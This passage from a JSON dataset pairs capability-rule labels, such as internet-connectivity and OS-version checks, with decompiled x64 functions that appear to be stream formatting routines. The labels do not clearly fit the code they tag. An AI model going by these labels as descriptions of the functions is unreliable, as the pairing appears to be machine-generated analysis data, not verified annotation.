0x140058398;\n        fcn.140058010(arg2, arg2_00, iVar4);\n        iStack116 = bVar17 + iStack116;\n        iVar14 = *(arg4 + 0x10);\n        iVar16 = iStack116;\n        if (iVar14 <= iVar16) goto code_r0x00014005826d;\n    }\n    else {\n        *(puVar9 + iVar14 + -8) = 0x14005823a;\n        arg1_00 = piVar12;\n        pcVar3 = sub.msvcrt.dll_memchr(piVar12, 0x2e, iVar16);\n        piVar6 = piStack136;\n        if (pcVar3 != NULL) {\n            pcVar3 = (pcVar3 - piVar12) + piVar15;\n            *pcVar3 = *(piStack136 + 9);\n            arg1_00 = piVar6;\n            if (*(piVar6 + 4) == '\\0') goto code_r0x000140058260;\n            goto code_r0x000140058320;\n        }\n        if ((*(piStack136 + 4) != '\\0') &&\n           ((iVar2 < 3 ||\n            (((*(piVar12 + 1) < ':' && (uVar5 = *(piVar12 + 2) - 0x30,  arg1_00 = uVar5,  uVar5 < 10)) &&\n             ('/' < *(piVar12 + 1))))))) goto code_r0x000140058320;\ncode_r0x000140058260:\n        iVar14 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        piVar6 = piVar15;\n        if (iVar14 <= iVar16) goto code_r0x00014005826d;\n    }\n    *(puVar11 + -8) = 0x1400583bb;\n    iVar4 = fcn.14000e880(arg2);\n    iVar4 = -iVar4;\n    puVar10 = puVar11 + iVar4;\n    *(puVar11 + iVar4 + 0x28) = iVar16;\n    iVar16 = iVar14;\n    *(puVar11 + iVar4 + 0x20) = iVar14;\n    *(puVar11 + iVar4 + -8) = 0x1400583e5;\n    fcn.14009c140(arg4, uStack148, puVar11 + iVar4 + 0x40, piVar6);\n    iStack116 = iVar14;\n    piVar6 = puVar11 + iVar4 + 0x40;\ncode_r0x00014005826d:\n    piVar12 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar8 = piStack144;\n    if (cVar8 == '\\0') {\n        pcVar1 = *(*piStack128 + 0x60);\n        *(puVar10 + -8) = 0x14005828f;\n        iVar14 = (*pcVar1)(piVar12, piVar6, iVar16);\n        if (iVar14 != iVar16) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar8;\n    return;\n}\n",
        "token_count": 2896
    },
    "1400584f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400584f0(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  unkbyte10 *noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong arg_70h, ulong arg_78h, ulong arg_80h)\n\n{\n    code *pcVar1;\n    int64_t arg2_00;\n    int32_t iVar2;\n    int64_t *arg1_00;\n    int64_t iVar3;\n    char *pcVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    ulong *puVar8;\n    char cVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t *piVar13;\n    uchar *puVar14;\n    int64_t *piVar15;\n    int64_t iVar16;\n    bool bVar17;\n    ulong var_8h;\n    ulong var_50h;\n    ulong var_58h_2;\n    ulong uStack320;\n    uchar auStack312 [32];\n    uchar *apuStack280 [4];\n    int64_t aiStack248 [9];\n    ulong *puStack176;\n    uint uStack164;\n    int64_t *piStack160;\n    uchar auStack152 [16];\n    int64_t *piStack136;\n    int64_t *piStack128;\n    uchar auStack120 [8];\n    ulong var_68h;\n    int32_t var_5ch;\n    ulong var_58h;\n    ulong var_50h_2;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piVar13 = &stack0xffffffffffffff08;\n    piStack128 = *arg3;\n    piStack160 = arg3[1];\n    piVar7 = arg4 + 0xd0;\n    uStack164 = noname_4;\n    auStack152._0_10_ = *noname_6;\n    apuStack280[3] = 0x14005854d;\n    piStack136 = fcn.140020fc0(piVar7);\n    puVar14 = *(arg4 + 8);\n    if (puVar14 < 0) {\n        puVar14 = 0x6;\n    }\n    apuStack280[3] = 0x140058570;\n    fcn.140078b30(arg4, &fcn.1400584f0::var_50h_2);\n    puVar10 = &stack0xfffffffffffffec8;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack320 = 0x140058815;\n        var_58h = fcn.14009f6c0();\n        _auStack120 = auStack152._0_10_;\n        uStack320 = 0x140058840;\n        puVar8 = &fcn.1400584f0::var_58h;\n        apuStack280[0] = &stack0xffffffffffffff88;\n        iVar2 = fcn.1400b05f0(&fcn.1400584f0::var_58h, &stack0xffffffffffffff08, 0x36, &fcn.1400584f0::var_50h_2);\n        var_5ch = iVar2;\n        if (0x35 < iVar2) {\n            uStack320 = 0x140058863;\n            iVar3 = fcn.14000e880(puVar8);\n            iVar3 = -iVar3;\n            puVar10 = &stack0xfffffffffffffec8 + iVar3;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x14005886b;\n            var_58h = fcn.14009f6c0();\n            piVar13 = &stack0xffffffffffffff08 + iVar3;\n            _auStack120 = auStack152._0_10_;\n            *(&stack0xfffffffffffffee8 + iVar3) = &stack0xffffffffffffff88;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x140058890;\n            var_5ch = fcn.1400b05f0(&fcn.1400584f0::var_58h, piVar13, iVar2 + 1, &fcn.1400584f0::var_50h_2);\n        }\n    }\n    else {\n        uStack320 = 0x140058591;\n        var_58h = fcn.14009f6c0();\n        puVar8 = &fcn.1400584f0::var_58h;\n        _auStack120 = auStack152._0_10_;\n        uStack320 = 0x1400585c5;\n        apuStack280[0] = puVar14;\n        apuStack280[1] = &stack0xffffffffffffff88;\n        puStack176 = puVar8;\n        iVar2 = fcn.1400b05f0(puVar8, &stack0xffffffffffffff08, 0x36, &fcn.1400584f0::var_50h_2);\n        var_5ch = iVar2;\n        puVar10 = &stack0xfffffffffffffec8;\n        piVar13 = &stack0xffffffffffffff08;\n        if (0x35 < iVar2) {\n            uStack320 = 0x1400586ec;\n            iVar3 = fcn.14000e880(puVar8);\n            iVar3 = -iVar3;\n            puVar10 = &stack0xfffffffffffffec8 + iVar3;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x1400586f4;\n            var_58h = fcn.14009f6c0();\n            piVar13 = &stack0xffffffffffffff08 + iVar3;\n            _auStack120 = auStack152._0_10_;\n            *(&stack0xfffffffffffffef0 + iVar3) = &stack0xffffffffffffff88;\n            *(&stack0xfffffffffffffee8 + iVar3) = puVar14;\n            puVar8 = puStack176;\n            *(&stack0xfffffffffffffec0 + iVar3) = 0x14005871f;\n            var_5ch = fcn.1400b05f0(puVar8, piVar13, iVar2 + 1, &fcn.1400584f0::var_50h_2);\n        }\n    }\n    iVar2 = var_5ch;\n    iVar16 = var_5ch;\n    *(puVar10 + -8) = 0x1400585df;\n    arg1_00 = fcn.1400b36a0(piVar7);\n    *(puVar10 + -8) = 0x1400585ef;\n    iVar3 = fcn.14000e880(piVar7);\n    iVar3 = -iVar3;\n    puVar11 = puVar10 + iVar3;\n    puVar12 = puVar10 + iVar3;\n    auStack152._0_8_ = piVar13 + iVar16;\n    piVar15 = puVar10 + iVar3 + 0x40;\n    if (*(arg1_00 + 7) == '\\x01') {\ncode_r0x000140058626:\n        arg1_00 = piVar7;\n        if (auStack152._0_8_ != piVar13) {\n            *(puVar10 + iVar3 + -8) = 0x140058639;\n            arg1_00 = piVar15;\n            sub.msvcrt.dll_memcpy(piVar15, piVar13, iVar16);\n        }\n    }\n    else {\n        if (*(arg1_00 + 7) == '\\0') {\n            *(puVar10 + iVar3 + -8) = 0x1400588ac;\n            piVar7 = arg1_00;\n            fcn.140025400(arg1_00);\n        }\n        pcVar1 = *(*arg1_00 + 0x38);\n        if (pcVar1 == 0x140025bc0) goto code_r0x000140058626;\n        *(puVar10 + iVar3 + -8) = 0x14005891b;\n        (*pcVar1)();\n    }\n    if (iVar16 == 0) {\n        if (*(piStack136 + 4) == '\\0') goto code_r0x000140058678;\n        pcVar4 = NULL;\ncode_r0x000140058740:\n        *(puVar10 + iVar3 + -8) = 0x14005874e;\n        iVar16 = fcn.14000e880(arg1_00);\n        iVar16 = -iVar16;\n        puVar12 = puVar10 + iVar16 + iVar3;\n        puVar11 = puVar10 + iVar16 + iVar3;\n        piVar7 = puVar10 + iVar16 + iVar3 + 0x40;\n        bVar17 = (*piVar13 - 0x2bU & 0xfd) == 0;\n        piVar13 = piVar7;\n        if (bVar17) {\n            cVar9 = *piVar15;\n            piVar15 = puVar10 + iVar3 + 0x41;\n            var_5ch = iVar2 + -1;\n            *piVar7 = cVar9;\n            piVar13 = puVar10 + iVar16 + iVar3 + 0x41;\n        }\n        iVar5 = piStack136[3];\n        arg2_00 = piStack136[2];\n        *(puVar10 + iVar16 + iVar3 + 0x30) = piVar15;\n        *(puVar10 + iVar16 + iVar3 + 0x20) = pcVar4;\n        *(puVar10 + iVar16 + iVar3 + 0x38) = &stack0xffffffffffffff9c;\n        *(puVar10 + iVar16 + iVar3 + 0x28) = piVar13;\n        *(puVar10 + iVar16 + iVar3 + -8) = 0x1400587b8;\n        fcn.140058010(arg2, arg2_00, iVar5);\n        var_5ch = bVar17 + var_5ch;\n        iVar3 = *(arg4 + 0x10);\n        iVar16 = var_5ch;\n        if (iVar3 <= iVar16) goto code_r0x000140058685;\n    }\n    else {\n        *(puVar10 + iVar3 + -8) = 0x140058652;\n        arg1_00 = piVar13;\n        pcVar4 = sub.msvcrt.dll_memchr(piVar13, 0x2e, iVar16);\n        piVar7 = piStack136;\n        if (pcVar4 != NULL) {\n            pcVar4 = (pcVar4 - piVar13) + piVar15;\n            *pcVar4 = *(piStack136 + 9);\n            arg1_00 = piVar7;\n            if (*(piVar7 + 4) == '\\0') goto code_r0x000140058678;\n            goto code_r0x000140058740;\n        }\n        if ((*(piStack136 + 4) != '\\0') &&\n           ((iVar2 < 3 ||\n            (((*(piVar13 + 1) < ':' && (uVar6 = *(piVar13 + 2) - 0x30,  arg1_00 = uVar6,  uVar6 < 10)) &&\n             ('/' < *(piVar13 + 1))))))) goto code_r0x000140058740;\ncode_r0x000140058678:\n        iVar3 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        piVar7 = piVar15;\n        if (iVar3 <= iVar16) goto code_r0x000140058685;\n    }\n    *(puVar12 + -8) = 0x1400587dd;\n    iVar5 = fcn.14000e880(arg2);\n    iVar5 = -iVar5;\n    puVar11 = puVar12 + iVar5;\n    *(puVar12 + iVar5 + 0x28) = iVar16;\n    iVar16 = iVar3;\n    *(puVar12 + iVar5 + 0x20) = iVar3;\n    *(puVar12 + iVar5 + -8) = 0x140058807;\n    fcn.14009c140(arg4, uStack164, puVar12 + iVar5 + 0x40, piVar7);\n    var_5ch = iVar3;\n    piVar7 = puVar12 + iVar5 + 0x40;\ncode_r0x000140058685:\n    piVar13 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar9 = piStack160;\n    if (cVar9 == '\\0') {\n        pcVar1 = *(*piStack128 + 0x60);\n        *(puVar11 + -8) = 0x1400586a7;\n        iVar3 = (*pcVar1)(piVar13, piVar7, iVar16);\n        if (iVar3 != iVar16) {\n            cVar9 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar9;\n    return;\n}\n",
        "token_count": 3069
    },
    "1400591c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.1400591c0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg3_00;\n    ulong arg4_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    ushort *arg1_00;\n    uint64_t arg2;\n    ushort *arg4_01;\n    ushort *puVar7;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uint32_t uStack168;\n    int64_t iStack160;\n    ushort auStack152 [2];\n    ushort auStack148 [18];\n    ushort auStack112 [6];\n    uint32_t uStack100;\n    ushort *puStack96;\n    int64_t iStack88;\n    uint uStack80;\n    uint32_t uStack76;\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puStack96 = &stack0xffffffffffffff68;\n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    iStack160 = 0x1400591f8;\n    iVar6 = fcn.1400210c0(arg4 + 0xd0);\n    puVar9 = &stack0xffffffffffffff38;\n    puVar10 = &stack0xffffffffffffff38;\n    arg2 = noname_5;\n    iStack88 = iVar6 + 0x4c;\n    uStack76 = *(arg4 + 0x18);\n    uStack100 = uStack76 & 0x4a;\n    bVar13 = uStack100 != 0x40;\n    bVar14 = uStack100 != 8;\n    if ((noname_5 < 1) && (arg2 = -noname_5,  !bVar13 || !bVar14)) {\n        arg2 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff90;\n    uStack168 = bVar13 && bVar14;\n    uStack208 = 0x140059256;\n    iVar5 = fcn.1400afe30(arg1_00, arg2, iStack88, uStack76);\n    iVar12 = iVar5;\n    puVar7 = puStack96 + (0x14 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x00014005927e;\ncode_r0x0001400593ba:\n        arg4_01 = puVar7;\n        if (((uStack76 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack100 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iStack88 + 4 + (uStack76 >> 0xe & 1) * 2);\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n        }\ncode_r0x000140059290:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x00014005929c;\n    }\n    else {\n        uStack208 = 0x14005936f;\n        iVar11 = fcn.14000e880(arg1_00);\n        arg3_00 = *(iVar6 + 0x10);\n        uVar1 = *(iVar6 + 0x4a);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff38 + iVar11;\n        puVar10 = &stack0xffffffffffffff38 + iVar11;\n        *(&stack0xffffffffffffff58 + iVar11) = puVar7;\n        *(&stack0xffffffffffffff60 + iVar11) = puVar7 + iVar12;\n        puStack96 = &stack0xffffffffffffff6c + iVar11;\n        *(&stack0xffffffffffffff30 + iVar11) = 0x1400593a1;\n        iVar12 = fcn.1400b0190(&stack0xffffffffffffff6c + iVar11, uVar1, arg3_00, arg4_00);\n        iVar5 = iVar12 - puStack96 >> 1;\n        arg1_00 = puStack96;\n        puVar7 = puStack96;\n        if (!bVar13 || !bVar14) goto code_r0x0001400593ba;\ncode_r0x00014005927e:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4c);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x000140059290;\n        }\n        arg4_01 = puVar7;\n        if ((uStack76 & 0x800) == 0) goto code_r0x000140059290;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4e);\n        if (iVar12 <= iVar11) goto code_r0x00014005929c;\n    }\n    *(puVar9 + -8) = 0x140059309;\n    iVar6 = fcn.14000e880(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x140059332;\n    fcn.14009c430(arg4, uStack80, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x00014005929c:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x1400592b8;\n        iVar6 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar6) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1803
    },
    "14005942": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140059420(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    int64_t *piVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    code *pcVar6;\n    ulong arg4_00;\n    ulong arg3_00;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong *arg1_00;\n    ushort *arg1_01;\n    ushort *puVar11;\n    ushort *arg4_01;\n    char cVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    bool bVar15;\n    uint32_t uVar16;\n    ulong var_8h_2;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uint32_t uStack168;\n    int64_t iStack160;\n    uchar auStack152 [4];\n    ushort auStack148 [18];\n    ushort auStack112 [4];\n    int64_t iStack104;\n    uint uStack92;\n    uchar *puStack88;\n    ushort *puStack80;\n    ulong var_20h;\n    ulong var_14h;\n    ulong var_8h;\n    \n    puStack88 = &stack0xffffffffffffff68;\n    piVar4 = *arg3;\n    piVar5 = arg3[1];\n    uStack92 = noname_4;\n    iStack160 = 0x140059454;\n    iVar8 = fcn.1400261c0(0x1400fb990);\n    piVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar8 * 8;\n    iVar9 = *piVar1;\n    if (iVar9 == 0) {\n        iStack160 = 0x14005964a;\n        arg1_00 = fcn.1400b6520(0xd0);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b3e0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        *(arg1_00 + 9) = 0;\n        *(arg1_00 + 0x19) = 0;\n        iStack160 = 0x1400596af;\n        fcn.140097f50(arg1_00, arg4 + 0xd0);\n        iStack160 = 0x1400596c1;\n        fcn.14009d930(*(arg4 + 0xd0), arg1_00, iVar8);\n        iVar9 = *piVar1;\n    }\n    uVar3 = *(arg4 + 0x18);\n    puVar13 = &stack0xffffffffffffff38;\n    puVar14 = &stack0xffffffffffffff38;\n    iStack104 = iVar9 + 0x4c;\n    arg1_01 = &stack0xffffffffffffff90;\n    uVar16 = uVar3 & 0x4a;\n    bVar15 = uVar16 != 0x40 && uVar16 != 8;\n    puStack80 = puStack80 & 0xffffffffffffff00 | bVar15;\n    uStack168 = bVar15;\n    uStack208 = 0x1400594c0;\n    iVar7 = fcn.1400afe30(arg1_01, noname_5, iStack104, uVar3);\n    iVar8 = iVar7;\n    puVar11 = puStack88 + (0x14 - iVar7) * 2;\n    puStack88._0_1_ = puStack80;\n    if (*(iVar9 + 0x20) != '\\0') {\n        puStack88 = puStack88 & 0xffffffffffffff00 | puStack80 & 0xff;\n        uStack208 = 0x14005955b;\n        iVar10 = fcn.14000e880(arg1_01);\n        uVar2 = *(iVar9 + 0x4a);\n        arg4_00 = *(iVar9 + 0x18);\n        iVar10 = -iVar10;\n        puVar13 = &stack0xffffffffffffff38 + iVar10;\n        puVar14 = &stack0xffffffffffffff38 + iVar10;\n        arg3_00 = *(iVar9 + 0x10);\n        *(&stack0xffffffffffffff60 + iVar10) = puVar11 + iVar8;\n        *(&stack0xffffffffffffff58 + iVar10) = puVar11;\n        puStack80 = &stack0xffffffffffffff6c + iVar10;\n        *(&stack0xffffffffffffff30 + iVar10) = 0x14005958d;\n        iVar8 = fcn.1400b0190(&stack0xffffffffffffff6c + iVar10, uVar2, arg3_00, arg4_00);\n        iVar7 = iVar8 - puStack80 >> 1;\n        puVar11 = puStack80;\n        arg1_01 = puStack80;\n    }\n    arg4_01 = puVar11;\n    if (((puStack88 == '\\0') && (puVar13 = puVar14,  (uVar3 & 0x200) != 0)) && (noname_5 != 0)) {\n        if (uVar16 == 0x40) {\n            iVar7 = iVar7 + 1;\n            arg4_01 = puVar11 + -1;\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n        else {\n            iVar7 = iVar7 + 2;\n            arg4_01 = puVar11 + -2;\n            puVar11[-1] = *(iStack104 + 4 + (uVar3 >> 0xe & 1) * 2);\n            *arg4_01 = *(iVar9 + 0x54);\n        }\n    }\n    iVar9 = *(arg4 + 0x10);\n    iVar8 = iVar7;\n    puVar11 = arg4_01;\n    puVar14 = puVar13;\n    if (iVar8 < iVar9) {\n        *(puVar13 + -8) = 0x14005960e;\n        iVar10 = fcn.14000e880(arg1_01);\n        iVar10 = -iVar10;\n        puVar14 = puVar13 + iVar10;\n        *(puVar13 + iVar10 + 0x28) = iVar8;\n        puVar11 = puVar13 + iVar10 + 0x30;\n        iVar8 = iVar9;\n        *(puVar13 + iVar10 + 0x20) = iVar9;\n        *(puVar13 + iVar10 + -8) = 0x140059637;\n        fcn.14009c430(arg4, uStack92, puVar11, arg4_01);\n    }\n    *(arg4 + 0x10) = 0;\n    cVar12 = piVar5;\n    if (cVar12 == '\\0') {\n        pcVar6 = *(*piVar4 + 0x60);\n        *(puVar14 + -8) = 0x140059516;\n        iVar9 = (*pcVar6)(piVar4, puVar11, iVar8);\n        if (iVar8 != iVar9) {\n            cVar12 = '\\x01';\n        }\n    }\n    *arg1 = piVar4;\n    *(arg1 + 1) = cVar12;\n    return arg1;\n}\n",
        "token_count": 1857
    },
    "14005971": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140059710(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4, ulong noname_4, int64_t noname_5, \n             ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    ulong arg3_00;\n    ulong arg4_00;\n    int32_t iVar5;\n    int64_t iVar6;\n    ushort *arg1_00;\n    ushort *arg4_01;\n    ushort *puVar7;\n    char cVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong var_8h_2;\n    ulong uStack240;\n    uchar auStack232 [32];\n    uint32_t uStack200;\n    int64_t iStack192;\n    ushort auStack184 [2];\n    ushort auStack180 [10];\n    ulong uStack160;\n    ushort auStack104 [2];\n    uint32_t uStack100;\n    ushort *puStack96;\n    int64_t iStack88;\n    uint uStack80;\n    uint32_t uStack76;\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar2 = *arg3;\n    piVar3 = arg3[1];\n    uStack80 = noname_4;\n    uStack160 = 0x140059748;\n    iVar6 = fcn.1400210c0(arg4 + 0xd0);\n    puVar9 = &stack0xffffffffffffff18;\n    puVar10 = &stack0xffffffffffffff18;\n    iStack88 = iVar6 + 0x4c;\n    puStack96 = &stack0xffffffffffffff48;\n    uStack76 = *(arg4 + 0x18);\n    uStack100 = uStack76 & 0x4a;\n    bVar13 = uStack100 != 0x40;\n    bVar14 = uStack100 != 8;\n    iVar12 = noname_5;\n    if ((noname_5 < 1) && (iVar12 = -noname_5,  !bVar13 || !bVar14)) {\n        iVar12 = noname_5;\n    }\n    arg1_00 = &stack0xffffffffffffff98;\n    uStack200 = bVar13 && bVar14;\n    uStack240 = 0x1400597a7;\n    iVar5 = fcn.1400aff00(arg1_00, iVar12, iStack88, uStack76);\n    iVar12 = iVar5;\n    puVar7 = puStack96 + (0x28 - iVar5);\n    if (*(iVar6 + 0x20) == '\\0') {\n        if (bVar13 && bVar14) goto code_r0x0001400597cf;\ncode_r0x00014005990a:\n        arg4_01 = puVar7;\n        if (((uStack76 & 0x200) != 0) && (noname_5 != 0)) {\n            if (uStack100 == 0x40) {\n                iVar5 = iVar5 + 1;\n                arg4_01 = puVar7 + -1;\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n            else {\n                iVar5 = iVar5 + 2;\n                arg4_01 = puVar7 + -2;\n                puVar7[-1] = *(iStack88 + 4 + (uStack76 >> 0xe & 1) * 2);\n                *arg4_01 = *(iVar6 + 0x54);\n            }\n        }\ncode_r0x0001400597e1:\n        iVar12 = *(arg4 + 0x10);\n        iVar11 = iVar5;\n        puVar9 = puVar10;\n        if (iVar12 <= iVar11) goto code_r0x0001400597ed;\n    }\n    else {\n        uStack240 = 0x1400598bf;\n        iVar11 = fcn.14000e880(arg1_00);\n        arg3_00 = *(iVar6 + 0x10);\n        uVar1 = *(iVar6 + 0x4a);\n        arg4_00 = *(iVar6 + 0x18);\n        iVar11 = -iVar11;\n        puVar9 = &stack0xffffffffffffff18 + iVar11;\n        puVar10 = &stack0xffffffffffffff18 + iVar11;\n        *(&stack0xffffffffffffff38 + iVar11) = puVar7;\n        *(&stack0xffffffffffffff40 + iVar11) = puVar7 + iVar12;\n        puStack96 = &stack0xffffffffffffff4c + iVar11;\n        *(&stack0xffffffffffffff10 + iVar11) = 0x1400598f1;\n        iVar12 = fcn.1400b0190(&stack0xffffffffffffff4c + iVar11, uVar1, arg3_00, arg4_00);\n        iVar5 = iVar12 - puStack96 >> 1;\n        arg1_00 = puStack96;\n        puVar7 = puStack96;\n        if (!bVar13 || !bVar14) goto code_r0x00014005990a;\ncode_r0x0001400597cf:\n        puVar10 = puVar9;\n        if (noname_5 < 0) {\n            iVar5 = iVar5 + 1;\n            puVar7[-1] = *(iVar6 + 0x4c);\n            arg4_01 = puVar7 + -1;\n            goto code_r0x0001400597e1;\n        }\n        arg4_01 = puVar7;\n        if ((uStack76 & 0x800) == 0) goto code_r0x0001400597e1;\n        iVar12 = *(arg4 + 0x10);\n        arg4_01 = puVar7 + -1;\n        iVar11 = iVar5 + 1;\n        *arg4_01 = *(iVar6 + 0x4e);\n        if (iVar12 <= iVar11) goto code_r0x0001400597ed;\n    }\n    *(puVar9 + -8) = 0x140059859;\n    iVar6 = fcn.14000e880(arg1_00);\n    iVar6 = -iVar6;\n    *(puVar9 + iVar6 + 0x28) = iVar11;\n    iVar11 = iVar12;\n    *(puVar9 + iVar6 + 0x20) = iVar12;\n    *(puVar9 + iVar6 + -8) = 0x140059882;\n    fcn.14009c430(arg4, uStack80, puVar9 + iVar6 + 0x30, arg4_01);\n    arg4_01 = puVar9 + iVar6 + 0x30;\n    puVar9 = puVar9 + iVar6;\ncode_r0x0001400597ed:\n    *(arg4 + 0x10) = 0;\n    cVar8 = piVar3;\n    if (cVar8 == '\\0') {\n        pcVar4 = *(*piVar2 + 0x60);\n        *(puVar9 + -8) = 0x140059809;\n        iVar12 = (*pcVar4)(piVar2, arg4_01, iVar11);\n        if (iVar11 != iVar12) {\n            cVar8 = '\\x01';\n        }\n    }\n    *arg1 = piVar2;\n    *(arg1 + 1) = cVar8;\n    return arg1;\n}\n",
        "token_count": 1806
    },
    "14005997": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
